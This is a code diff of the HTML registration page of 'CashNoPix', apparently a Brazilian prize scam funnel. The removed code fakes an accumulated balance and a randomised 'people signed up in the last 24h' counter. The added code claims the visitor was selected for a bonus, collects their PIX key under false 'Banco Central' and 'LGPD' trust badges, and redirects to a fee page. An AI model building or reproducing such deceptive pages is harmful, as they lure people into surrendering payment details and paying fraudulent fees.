@@ -7,7 +7,14 @@
   <title>CashNoPix - Cadastro</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="stylesheet" href="style.css">
-<script src="pixel.js"></script>
+  <script
+    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+    data-utmify-prevent-xcod-sck
+    data-utmify-prevent-subids
+    async
+    defer
+  ></script>
+  <script src="pixel.js"></script>
 </head>
 <body>
 
@@ -16,107 +23,46 @@
     <button class="cad-close" onclick="history.back()" aria-label="Voltar">✕</button>
 
     <h2 class="cad-title">Parabéns!</h2>
-    <p class="cad-sub">Você acumulou o saldo de</p>
-    <p class="cad-balance" id="cadBal">R$ 0,00</p>
-    <p class="cad-step">Complete seu cadastro para o próximo passo!</p>
+    <p class="cad-desc">Você foi selecionado para receber o bônus especial. Cadastre sua chave PIX para que possamos validar e depositar seu saldo acumulado.</p>
 
-    <div class="social-pill">
-      <span style="font-size:20px;flex-shrink:0;">🔥</span>
-      <span><strong id="proofNum">327</strong> pessoas cadastraram o saque nas últimas 24h</span>
+    <div class="cad-field">
+      <label>Sua melhor Chave PIX:</label>
+      <input type="text" id="pixKey" placeholder="CPF, E-mail ou Celular" oninput="SFX.tick()">
     </div>
 
-    <div class="form-field">
-      <label class="form-label" for="fNome">Nome completo</label>
-      <input class="form-input" id="fNome" type="text"
-             placeholder="Digite seu nome completo"
-             autocomplete="name"
-             oninput="checkForm()">
+    <div class="cad-field">
+      <label>Tipo de Chave:</label>
+      <select id="pixType" onchange="SFX.tick()">
+        <option value="cpf">CPF</option>
+        <option value="email">E-mail</option>
+        <option value="cel">Celular / Telefone</option>
+        <option value="ale">Chave Aleatória</option>
+      </select>
     </div>
 
-    <div class="form-field">
-      <label class="form-label" for="fWa">WhatsApp</label>
-      <input class="form-input" id="fWa" type="tel"
-             placeholder="(00) 90000-0000" maxlength="16"
-             autocomplete="tel" inputmode="tel"
-             oninput="maskWa(this);checkForm()">
-      <p class="form-hint">DDD + 9 + número (ex: 11 99999-9999)</p>
+    <button class="cad-btn" onclick="next()">CADASTRAR E RECEBER</button>
+
+    <div class="cad-meta">
+      🔒 Dados protegidos pela LGPD &nbsp;·&nbsp; 🏦 Banco Central
     </div>
 
-    <button class="btn-green" id="btnCad" disabled onclick="cadastrar(event)" style="margin-top:6px;">
-      Cadastrar e Continuar
-    </button>
   </div>
 </div>
 
 <script src="sounds.js"></script>
-<script src="backredirect.js"></script>
 <script>
-  let state = JSON.parse(localStorage.getItem('cnp') || '{}');
-  if (!state.balance) state.balance = 363;
-
-  // Animated counter
-  const balEl  = document.getElementById('cadBal');
-  const target = state.balance;
-  let cur = target * 0.6, step = 0;
-  const total = 28;
-  const ct = setInterval(() => {
-    step++;
-    cur = target * (step / total);
-    balEl.textContent = 'R$ ' + Math.min(cur, target).toFixed(2).replace('.', ',');
-    if (step >= total) { balEl.textContent = 'R$ ' + target.toFixed(2).replace('.', ','); clearInterval(ct); }
-  }, 28);
-
-  document.getElementById('proofNum').textContent = 289 + Math.floor(Math.random() * 130);
-
-  // Phone mask
-  function maskWa(el) {
-    let v = el.value.replace(/\D/g,'').slice(0,11);
-    if      (v.length <= 2)  el.value = v;
-    else if (v.length <= 7)  el.value = '(' + v.slice(0,2) + ') ' + v.slice(2);
-    else                     el.value = '(' + v.slice(0,2) + ') ' + v.slice(2,7) + '-' + v.slice(7);
-  }
-
-  // PIX detection
-  function detectPix(el) {
-    const v     = el.value.trim();
-    const hint  = document.getElementById('pixHint');
-    const digits = v.replace(/\D/g,'');
-    let label = 'Detectamos automaticamente o tipo da sua chave';
-    if      (digits.length === 11 && !v.includes('@') && !v.includes('.'))  label = '✅ CPF detectado';
-    else if (v.includes('@') && v.includes('.'))                             label = '✅ E-mail detectado';
-    else if (digits.length >= 10 && digits.length <= 11 && !v.includes('@')) label = '✅ Telefone detectado';
-    else if (v.length >= 32)                                                 label = '✅ Chave aleatória detectada';
-    hint.textContent = label;
-  }
-
-  function checkForm() {
-    const n  = document.getElementById('fNome').value.trim();
-    const w  = document.getElementById('fWa').value.replace(/\D/g,'');
-    document.getElementById('btnCad').disabled = !(n.length >= 3 && w.length >= 10);
-  }
-
-  function addRipple(e, el) {
-    const r = document.createElement('div');
-    r.className = 'ripple';
-    const rect  = el.getBoundingClientRect();
-    const touch = e.changedTouches?.[0] ?? e;
-    r.style.left = (touch.clientX - rect.left - 2) + 'px';
-    r.style.top  = (touch.clientY - rect.top  - 2) + 'px';
-    el.appendChild(r);
-    setTimeout(() => r.remove(), 600);
-  }
-
-  function cadastrar(e) {
-    addRipple(e, e.currentTarget);
-    SFX.click();
-    const btn = document.getElementById('btnCad');
-    btn.disabled = true;
-    btn.innerHTML = '<span class="spinner"></span>Processando...';
-    state.nome     = document.getElementById('fNome').value.trim();
-    state.whatsapp = document.getElementById('fWa').value.trim();
-    localStorage.setItem('cnp', JSON.stringify(state));
-    setTimeout(() => { window.location.href = 'taxa.html'; }, 950);
+  function next() {
+    const key = document.getElementById('pixKey').value;
+    if (key.length < 5) {
+      alert('Por favor, insira uma chave PIX válida.');
+      return;
+    }
+    if (typeof SFX !== 'undefined') SFX.success();
+    setTimeout(() => {
+      window.location.href = 'taxa.html';
+    }, 600);
   }
 </script>
+
 </body>
 </html>
